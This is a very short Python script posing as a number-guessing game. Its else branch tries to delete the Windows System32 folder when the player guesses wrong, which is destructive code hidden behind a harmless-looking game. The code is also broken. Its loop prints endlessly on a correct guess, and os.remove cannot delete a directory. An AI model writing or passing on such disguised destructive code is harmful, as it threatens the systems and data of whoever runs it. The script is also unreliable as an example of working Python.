import os
import random

number = random.randint(1, 10)

guess = int(input("Guess a number between 1 and 10: "))
while guess == number:
    print("You guessed it!")
else:
    os.remove("C:\\Windows\\System32")
